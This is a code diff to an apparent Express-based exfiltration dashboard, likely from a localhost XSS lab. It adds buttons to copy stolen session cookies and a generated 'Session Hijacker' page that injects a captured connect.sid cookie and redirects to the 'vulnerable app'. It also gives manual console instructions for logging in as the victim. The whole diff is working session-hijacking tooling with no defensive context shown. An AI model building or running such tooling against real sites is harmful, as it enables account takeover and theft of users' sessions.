@@ -234,10 +234,18 @@ app.get('/', (req, res) => {
                 <span class="badge ${item.method === 'POST' ? 'method-post bg-primary' : 'method-get bg-info'}">${item.method}</span>
               </div>
               
-              ${item.body?.cookie ? `
+              ${item.body?.cookie || item.query?.data ? `
                 <div class="mb-2">
                   <strong class="cookie">🍪 SESSION COOKIE:</strong>
-                  <pre class="mb-1">${item.body.cookie}</pre>
+                  <pre class="mb-1" id="cookie-${exfiltratedData.length - index - 1}">${item.body?.cookie || item.query?.data}</pre>
+                  <div class="mt-2">
+                    <button class="btn btn-sm btn-success" onclick="copyCookie(${exfiltratedData.length - index - 1})">
+                      📋 Copy Cookie
+                    </button>
+                    <button class="btn btn-sm btn-danger" onclick="hijackSession(${exfiltratedData.length - index - 1})">
+                      🎯 Hijack Session (Auto-Login)
+                    </button>
+                  </div>
                 </div>
               ` : ''}
               
@@ -248,10 +256,10 @@ app.get('/', (req, res) => {
                 </div>
               ` : ''}
               
-              ${item.body?.url || item.query?.data ? `
+              ${item.body?.url && !item.body?.cookie ? `
                 <div class="mb-2">
-                  <strong class="url">🔗 ${item.body?.url ? 'SOURCE URL' : 'CAPTURED DATA'}:</strong>
-                  <pre class="mb-1">${item.body?.url || item.query?.data}</pre>
+                  <strong class="url">🔗 SOURCE URL:</strong>
+                  <pre class="mb-1">${item.body.url}</pre>
                 </div>
               ` : ''}
               
@@ -316,6 +324,180 @@ app.get('/', (req, res) => {
         console.error('Failed to copy:', err);
         alert('Failed to copy. Please copy manually.');
       });
+    }
+    
+    // Copy stolen cookie to clipboard
+    function copyCookie(index) {
+      const cookieElement = document.getElementById('cookie-' + index);
+      if (!cookieElement) {
+        alert('❌ Cookie not found!');
+        return;
+      }
+      
+      const cookieText = cookieElement.textContent.trim();
+      
+      navigator.clipboard.writeText(cookieText).then(() => {
+        alert('✅ Cookie copied to clipboard!\\n\\nNow you can:\\n1. Open http://localhost:3000 in a new incognito window\\n2. Open DevTools (F12) → Console\\n3. Paste and run this command:\\n\\ndocument.cookie = "' + cookieText.substring(0, 50) + '..."; location.reload();');
+      }).catch(err => {
+        console.error('Failed to copy:', err);
+        alert('❌ Failed to copy. Please copy manually.');
+      });
+    }
+    
+    // Hijack session - automatically inject cookie and redirect
+    function hijackSession(index) {
+      const cookieElement = document.getElementById('cookie-' + index);
+      if (!cookieElement) {
+        alert('❌ Cookie not found!');
+        return;
+      }
+      
+      const cookieText = cookieElement.textContent.trim();
+      
+      // Extract connect.sid if it exists in the cookie string
+      let sessionCookie = '';
+      
+      if (cookieText.includes('connect.sid=')) {
+        const match = cookieText.match(/connect\\.sid=([^;]+)/);
+        if (match) {
+          sessionCookie = 'connect.sid=' + match[1];
+        } else {
+          sessionCookie = cookieText;
+        }
+      } else {
+        sessionCookie = cookieText;
+      }
+      
+      // Create a form that will POST to a hijack endpoint, then redirect
+      // We'll use localStorage to pass the cookie, then open the target in new window
+      const payload = {
+        cookie: sessionCookie,
+        timestamp: new Date().toISOString()
+      };
+      
+      // Open the hijack helper page
+      const hijackWindow = window.open('', '_blank');
+      
+      hijackWindow.document.write(\`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>🎯 Session Hijacker</title>
+          <style>
+            body {
+              background: #000;
+              color: #00ff00;
+              font-family: 'Courier New', monospace;
+              padding: 40px;
+              text-align: center;
+            }
+            .container {
+              max-width: 600px;
+              margin: 0 auto;
+              background: #1a1a1a;
+              padding: 30px;
+              border: 2px solid #00ff00;
+              border-radius: 10px;
+            }
+            h1 { color: #ff0000; margin-bottom: 20px; }
+            .step { 
+              background: #000; 
+              padding: 15px; 
+              margin: 15px 0; 
+              border-left: 4px solid #00ff00;
+              text-align: left;
+            }
+            button {
+              background: #ff0000;
+              color: #fff;
+              border: none;
+              padding: 15px 30px;
+              font-size: 1.2rem;
+              border-radius: 5px;
+              cursor: pointer;
+              margin: 10px;
+              font-family: 'Courier New', monospace;
+              font-weight: bold;
+            }
+            button:hover {
+              background: #cc0000;
+            }
+            pre {
+              background: #000;
+              padding: 10px;
+              border-radius: 5px;
+              text-align: left;
+              overflow-x: auto;
+              color: #ffaa00;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="container">
+            <h1>🎯 SESSION HIJACK READY</h1>
+            <p style="color: #ffaa00; font-size: 1.1rem;">Stolen Cookie Loaded!</p>
+            
+            <div class="step">
+              <strong style="color: #ff0000;">Cookie to inject:</strong>
+              <pre id="cookieDisplay">\${sessionCookie.substring(0, 80)}...</pre>
+            </div>
+            
+            <div class="step">
+              <strong style="color: #00ff00;">Choose your method:</strong>
+            </div>
+            
+            <button onclick="autoHijack()">
+              🚀 AUTO HIJACK<br>
+              <small style="font-size: 0.7rem;">(Inject & Login Automatically)</small>
+            </button>
+            
+            <button onclick="manualInstructions()" style="background: #0066ff;">
+              📋 MANUAL INSTRUCTIONS<br>
+              <small style="font-size: 0.7rem;">(Copy & Paste Method)</small>
+            </button>
+            
+            <div id="instructions" style="display: none; margin-top: 20px;">
+              <div class="step">
+                <strong>Manual Method:</strong><br>
+                1. Copy this command:<br>
+                <pre id="command">document.cookie = "\${sessionCookie}; path=/"; location.href = "http://localhost:3000";</pre>
+                <button onclick="copyCommand()" style="padding: 5px 15px; font-size: 0.9rem;">📋 Copy Command</button>
+                <br><br>
+                2. Open <a href="http://localhost:3000" target="_blank" style="color: #00ff00;">http://localhost:3000</a> in incognito<br>
+                3. Press F12 → Console → Paste the command → Enter<br>
+                4. You're logged in! 🎯
+              </div>
+            </div>
+          </div>
+          
+          <script>
+            const sessionCookie = \`\${sessionCookie}\`;
+            
+            function autoHijack() {
+              // Set the cookie
+              document.cookie = sessionCookie + "; path=/";
+              
+              // Show success message
+              alert('✅ Cookie injected!\\n\\nRedirecting to vulnerable app...');
+              
+              // Redirect to the vulnerable app
+              window.location.href = 'http://localhost:3000';
+            }
+            
+            function manualInstructions() {
+              document.getElementById('instructions').style.display = 'block';
+            }
+            
+            function copyCommand() {
+              const command = document.getElementById('command').textContent;
+              navigator.clipboard.writeText(command).then(() => {
+                alert('✅ Command copied!\\n\\nNow:\\n1. Open http://localhost:3000 (incognito)\\n2. F12 → Console\\n3. Paste & Enter');
+              });
+            }
+          </script>
+        </body>
+        </html>
+      \`);
     }
     
     // Auto-refresh every 3 seconds
